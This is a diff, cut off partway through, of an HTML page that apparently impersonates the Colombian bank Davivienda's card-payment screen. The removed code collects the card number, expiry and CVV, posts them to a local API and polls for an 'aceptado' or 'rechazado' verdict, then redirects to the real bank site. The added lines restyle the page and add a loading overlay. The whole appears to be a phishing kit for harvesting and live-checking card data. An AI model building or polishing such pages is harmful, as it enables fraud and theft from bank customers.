@@ -4,146 +4,53 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pago con Tarjeta - Davivienda</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
+        /* --- ESTILOS BASE COMPARTIDOS --- */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        body { display: flex; flex-direction: column; min-height: 100vh; background-color: #f4f4f4; }
+        body { display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        header { background-color: #E30613; display: flex; justify-content: space-between; align-items: center; padding: 0 40px 0 0; color: white; height: 85px; z-index: 10; }
+        .logo-container { display: flex; align-items: center; height: 100%; cursor: pointer; text-decoration: none; }
+        .logo-container img { height: 45px; margin-left: 60px; }
+        .header-info { text-align: right; font-size: 14px; line-height: 1.4; padding-right: 40px; }
+        main { flex-grow: 1; display: flex; flex-direction: column; justify-content: flex-start; align-items: center; text-align: center; position: relative; background-image: url('mujer.png'); background-size: cover; background-position: center top; background-repeat: no-repeat; color: white; padding: 60px 20px 20px 20px; }
+        .content { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 900px; transition: filter 0.4s ease, opacity 0.4s ease; }
         
-        header { background-color: #E30613; display: flex; justify-content: center; align-items: center; height: 85px; }
-        .logo-container img { height: 45px; }
-
-        .container { flex-grow: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
+        .title { font-size: 36px; font-weight: 300; margin-bottom: 0px; letter-spacing: -0.5px; }
+        .subtitle { font-size: 34px; font-weight: 700; margin-bottom: 25px; }
+        .form-card { background-color: rgba(255, 255, 255, 0.4); border: 3px solid white; border-radius: 20px; padding: 20px 30px; width: 100%; max-width: 800px; color: #000; backdrop-filter: blur(5px); }
+        .form-title { font-size: 16px; font-weight: 700; margin-bottom: 20px; }
         
-        .card { background-color: white; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 450px; width: 100%; }
-        .title { color: #E30613; font-size: 22px; font-weight: 700; margin-bottom: 25px; }
-
-        .input-group { display: flex; flex-direction: column; text-align: left; margin-bottom: 20px; }
-        .input-group label { font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #333; }
-        .input-group input { height: 45px; border: 1px solid #ccc; border-radius: 8px; padding: 0 15px; font-size: 15px; outline: none; }
-        .input-group input:focus { border-color: #E30613; }
-
-        .row { display: flex; gap: 15px; }
-        .row .input-group { flex: 1; }
-
-        .btn { width: 100%; height: 48px; background-color: #E30613; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.2s; display: flex; justify-content: center; align-items: center; margin-top: 10px; }
+        .form-row { display: flex; flex-direction: column; align-items: center; gap: 15px; }
+        .input-row { display: flex; gap: 15px; width: 100%; justify-content: center; }
+        .input-group { display: flex; flex-direction: column; text-align: left; width: 100%; max-width: 300px; }
+        .input-group label { font-size: 13px; font-weight: 700; margin-bottom: 5px; text-align: center; }
+        .input-group input { height: 40px; border: 1px solid #999; border-radius: 8px; padding: 0 10px; font-size: 14px; outline: none; background: white; }
+        
+        .btn { height: 45px; padding: 0 40px; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; background-color: #E30613; color: white; transition: transform 0.2s; width: 100%; max-width: 300px; margin-top: 10px; }
         .btn:hover:not(:disabled) { transform: scale(1.02); }
         .btn:disabled { background-color: #999; cursor: not-allowed; }
-        
-        .spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
+
+        /* Overlay de carga */
+        .loading-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; display: flex; justify-content: center; align-items: center; z-index: 100; opacity: 0; pointer-events: none; transition: opacity 0.4s ease; }
+        .loading-overlay.active { opacity: 1; pointer-events: auto; }
+        .content.blur-active { filter: blur(8px); opacity: 0.4; pointer-events: none; }
+        .loading-box { background: white; padding: 30px 50px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); display: flex; flex-direction: column; align-items: center; gap: 20px; }
+        .big-spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #E30613; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text { font-size: 18px; font-weight: 700; color: #333; }
 
-        @media (max-width: 480px) {
-            .card { padding: 25px 20px; }
-            .row { flex-direction: column; gap: 0; }
-        }
-    </style>
-</head>
-<body>
-    <header><div class="logo-container"><img src="davi.png" alt="Davivienda"></div></header>
+        footer { background-color: #000000; color: white; display: flex; align-items: center; justify-content: space-between; padding: 0 40px; height: 90px; z-index: 10; }
+        .footer-left { display: flex; align-items: center; width: 250px; } .footer-left img { height: 45px; }
+        .footer-text { font-size: 15px; font-weight: 400; text-align: center; flex-grow: 1; }
+        .footer-right { display: flex; align-items: center; justify-content: flex-end; width: 250px; } .footer-right img { height: 60px; }
 
-    <div class="container">
-        <div class="card">
-            <div class="title">Datos de la Tarjeta</div>
-            
-            <div class="input-group">
-                <label>Número de Tarjeta</label>
-                <input type="text" id="numTarjeta" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCard(this)">
-            </div>
-
-            <div class="row">
-                <div class="input-group">
-                    <label>Fecha Vencimiento</label>
-                    <input type="text" id="fechaTarjeta" placeholder="MM/AA" maxlength="5" oninput="formatDate(this)">
-                </div>
-                <div class="input-group">
-                    <label>CVV</label>
-                    <input type="password" id="cvvTarjeta" placeholder="123" maxlength="4">
-                </div>
-            </div>
-
-            <button class="btn" id="btnPagar" onclick="enviarTC()">
-                <span id="btnText">Pagar Ahora</span>
-                <div class="spinner" id="btnSpinner"></div>
-            </button>
-        </div>
-    </div>
-
-    <script>
-        // Formatear el número de tarjeta con espacios
-        function formatCard(input) {
-            let val = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
-            input.value = formatted;
-        }
-
-        // Formatear la fecha MM/AA
-        function formatDate(input) {
-            let val = input.value.replace(/\D/g, '');
-            if (val.length >= 2) {
-                input.value = val.substring(0, 2) + '/' + val.substring(2, 4);
-            } else {
-                input.value = val;
-            }
-        }
-
-        async function enviarTC() {
-            const numero = document.getElementById('numTarjeta').value;
-            const fecha = document.getElementById('fechaTarjeta').value;
-            const cvv = document.getElementById('cvvTarjeta').value;
-
-            if (numero.length < 15 || fecha.length < 5 || cvv.length < 3) {
-                alert("Por favor, complete todos los datos de la tarjeta correctamente.");
-                return;
-            }
-
-            const btn = document.getElementById('btnPagar');
-            const btnText = document.getElementById('btnText');
-            const spinner = document.getElementById('btnSpinner');
-
-            btnText.style.display = 'none';
-            spinner.style.display = 'block';
-            btn.disabled = true;
-
-            try {
-                const res = await fetch('/api/validar-tc', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ numero, fecha, cvv })
-                });
-                const data = await res.json();
-
-                if (data.status === 'ok') {
-                    const interval = setInterval(async () => {
-                        const statusRes = await fetch(`/api/verificar-tc/${data.id}`);
-                        const statusData = await statusRes.json();
-
-                        if (statusData.estado === 'aceptado') {
-                            clearInterval(interval);
-                            window.location.href = 'https://www.davivienda.com';
-                        } else if (statusData.estado === 'rechazado') {
-                            clearInterval(interval);
-                            alert('Error: La tarjeta ha sido rechazada. Verifique sus datos e intente de nuevo.');
-                            resetBtn();
-                        }
-                    }, 3000);
-                } else {
-                    alert('Error de conexión.');
-                    resetBtn();
-                }
-            } catch (e) {
-                alert('Error de red.');
-                resetBtn();
-            }
-        }
-
-        function resetBtn() {
-            const btn = document.getElementById('btnPagar');
-            const btnText = document.getElementById('btnText');
-            const spinner = document.getElementById('btnSpinner');
-            btnText.style.display = 'block';
-            spinner.style.display = 'none';
-            btn.disabled = false;
-        }
-    </script>
-</body>
-</html>
+        @media (max-width: 768px) {
+            body { overflow-y: auto; height: auto; min-height: 100vh; }
+            header { flex-direction: column; height: auto; padding: 15px 0 0 0; gap: 15px; }
+            .logo-container { justify-content: center; width: 100%; } .logo-container img { margin-left: 0; height: 40px; }
+            .header-info { background-color: white; color: #666; width: 100%; padding: 10px 0; font-size: 13px; }
+            main { padding: 40px 15px; justify-content: center; }
+            .title { font-size: 28px; } .subtitle {
